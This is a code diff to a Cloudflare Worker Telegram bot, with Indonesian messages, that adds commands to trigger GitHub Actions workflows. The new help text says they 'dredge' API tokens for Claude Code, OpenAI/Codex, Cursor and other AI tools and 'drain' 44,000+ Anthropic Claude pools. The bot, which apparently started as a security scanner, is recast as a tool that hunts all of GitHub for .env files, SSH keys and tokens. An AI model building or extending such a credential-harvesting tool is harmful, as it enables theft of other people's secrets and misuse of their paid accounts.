@@ -57,6 +57,50 @@ export default {
             return new Response("Unauthorized", { status: 403 });
           }
 
+          // --- MODE FAST DREDGER (AI CODING & LLM POOL) ---
+          if (
+            lowerText === "/fast" ||
+            lowerText === "/dredge" ||
+            lowerText === "/dredger" ||
+            lowerText === "fast" ||
+            lowerText === "dredge"
+          ) {
+            await sendTelegram(
+              chatId,
+              `⚡ <b>MEMICU FAST AI TOKEN DREDGER!</b>\n\n` +
+              `🎯 <b>Target:</b> Claude Code, OpenAI/Codex, Cursor, Cline, Aider, Devin, Qwen, DeepSeek\n` +
+              `🚀 <b>Mode:</b> Direct Raw HTTP Streamer (Nol Git Clone)\n` +
+              `⏳ <i>Menghubungi runner GitHub Actions (dredger.yml)...</i>`,
+              env
+            );
+            const res = await triggerGitHubWorkflow("dredger.yml", {}, env);
+            if (!res.ok) {
+              await sendTelegram(chatId, `❌ <b>Gagal memicu dredger:</b> <code>${esc(res.error)}</code>`, env);
+            }
+          }
+
+          // --- MODE KURAS ANTHROPIC CLAUDE (DEEP SLICING) ---
+          else if (
+            lowerText === "/claude" ||
+            lowerText === "/kuras" ||
+            lowerText === "/kurasclaude" ||
+            lowerText === "claude" ||
+            lowerText === "kuras"
+          ) {
+            await sendTelegram(
+              chatId,
+              `🦅 <b>MEMICU OPERASI KURAS ANTHROPIC CLAUDE!</b>\n\n` +
+              `🎯 <b>Target:</b> 44.000+ Kolam Anthropic Claude via Deep Slicing\n` +
+              `🛡️ <b>Database:</b> Anti-duplikasi terpusat di branch <code>state</code>\n` +
+              `⏳ <i>Menghubungi runner GitHub Actions (kuras_claude.yml)...</i>`,
+              env
+            );
+            const res = await triggerGitHubWorkflow("kuras_claude.yml", {}, env);
+            if (!res.ok) {
+              await sendTelegram(chatId, `❌ <b>Gagal memicu kuras claude:</b> <code>${esc(res.error)}</code>`, env);
+            }
+          }
+
           // --- MODE 1: DORK HUNT ---
           if (
             lowerText === "/dork" ||
@@ -143,21 +187,24 @@ export default {
           // --- COMMAND /START & /HELP ---
           else if (lowerText === "/start" || lowerText === "/help") {
             const helpMsg =
-              `🤖 <b>TruffleHog Security Scanner Bot (@ciro-scan)</b>\n` +
+              `🤖 <b>Security Scanner & AI Dredger Bot (@Dicopi_bot)</b>\n` +
               `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-              `Tuan Ciro dapat menjalankan 3 mode pemindaian langsung dari chat ini:\n\n` +
-              `1️⃣ <b>Mode Dork (Code Search):</b>\n` +
+              `Tuan Ciro dapat menjalankan mode pemindaian langsung dari chat ini:\n\n` +
+              `⚡ <b>1. Fast AI Dredger (Semua AI):</b>\n` +
+              `Ketik <code>/fast</code> atau <code>/dredge</code>\n` +
+              `<i>👉 Menyedot instan token Claude Code, OpenAI/Codex, Cursor, Cline, Aider, Devin, Qwen.</i>\n\n` +
+              `🦅 <b>2. Operation Kuras Anthropic:</b>\n` +
+              `Ketik <code>/claude</code> atau <code>/kuras</code>\n` +
+              `<i>👉 Deep Slicing 44.000+ kolam Anthropic Claude (Anti-scan ulang).</i>\n\n` +
+              `🎣 <b>3. Mode Dork (Code Search):</b>\n` +
               `Ketik <code>/dork</code> atau <code>/docker</code>\n` +
-              `<i>👉 Mencari & mengaudit repo berisiko tinggi dari GitHub Code Search.</i>\n\n` +
-              `2️⃣ <b>Mode Feed (Global Event):</b>\n` +
-              `Ketik <code>/feed</code> atau <code>feed</code>\n` +
-              `<i>👉 Menyedot dan mengaudit repo publik dari developer yang baru aktif.</i>\n\n` +
-              `3️⃣ <b>Mode Target URL:</b>\n` +
-              `Paste link repo GitHub langsung, contoh:\n` +
-              `<code>https://github.com/user/nama-repo</code>\n\n` +
-              `🔍 <i>Opsi Teks Bebas:</i> Tambah <code>-bebas &lt;kata&gt;</code> di belakang URL:\n` +
-              `<code>https://github.com/user/repo -bebas password</code>\n\n` +
-              `Semua temuan aktif & file laporan JSON akan langsung dikirimkan ke chat ini! 🚀`;
+              `<i>👉 Mencari file sensitif (.env, id_rsa, token) di seluruh GitHub.</i>\n\n` +
+              `🛰️ <b>4. Mode Feed Global:</b>\n` +
+              `Ketik <code>/feed</code>\n` +
+              `<i>👉 Audit repo publik developer yang baru aktif di GitHub.</i>\n\n` +
+              `🎯 <b>5. Scan Target Repo Langsung:</b>\n` +
+              `Paste link repo (contoh: <code>https://github.com/owner/repo</code>)\n` +
+              `<i>(Bisa tambah <code>-bebas &lt;kata&gt;</code> untuk cari kata apa saja).</i>`;
             await sendTelegram(chatId, helpMsg, env);
           }
 
@@ -192,13 +239,16 @@ function esc(s) {
     .replace(/>/g, "&gt;");
 }
 
-async function triggerGitHubScan(targetUrl, env, searchKeyword = "") {
+async function triggerGitHubWorkflow(workflowFile, inputs, env) {
   const owner = env.GH_OWNER || "ciroxtreme";
   const repo = env.GH_REPO || "ciro-scan";
-  const workflow = "scan.yml";
-  const url = `https://api.github.com/repos/${owner}/${repo}/actions/workflows/${workflow}/dispatches`;
+  const url = `https://api.github.com/repos/${owner}/${repo}/actions/workflows/${workflowFile}/dispatches`;
 
   try {
+    const bodyPayload = { ref: "main" };
+    if (inputs && Object.keys(inputs).length > 0) {
+      bodyPayload.inputs = inputs;
+    }
     const res = await fetch(url, {
       method: "POST",
       headers: {
@@ -206,13 +256,7 @@ async function triggerGitHubScan(targetUrl, env, searchKeyword = "") {
         "Accept": "application/vnd.github.v3+json",
         "User-Agent": "Cloudflare-Worker-CiroScan"
       },
-      body: JSON.stringify({
-        ref: "main",
-        inputs: {
-          target_url: targetUrl,
-          search_keyword: searchKeyword || ""
-        }
-      })
+      body: JSON.stringify(bodyPayload)
     });
 
     if (res.status === 204) {
@@ -224,6 +268,13 @@ async function triggerGitHubScan(targetUrl, env, searchKeyword = "") {
   } catch (e) {
     return { ok: false, error: e.message };
   }
+}
+
+async function triggerGitHubScan(targetUrl, env, searchKeyword = "") {
+  return triggerGitHubWorkflow("scan.yml", {
+    target_url: targetUrl,
+    search_keyword: searchKeyword || ""
+  }, env);
 }
 
 async function sendTelegram(chatId, htmlText, env) {
